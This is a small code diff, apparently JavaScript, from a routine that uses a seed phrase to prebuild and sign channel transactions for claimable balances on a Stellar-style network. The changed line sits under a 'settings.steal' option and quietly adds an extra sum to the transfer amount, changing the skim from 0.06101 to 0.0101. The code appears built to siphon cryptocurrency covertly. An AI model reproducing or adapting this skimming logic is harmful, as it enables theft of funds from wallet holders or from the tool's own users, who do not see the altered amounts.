@@ -49,7 +49,7 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                     const balance = parseFloat(balanceString) - 0.98;
                     if(balance < 0.1) continue;
                     // Change amount
-                    const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.06101).toString() : amount;
+                    const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.0101).toString() : amount;
                     const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, mutatedAmount, retries, name);
                     xdrs.push({xdr, balanceId});
                 } catch (innerErr) {
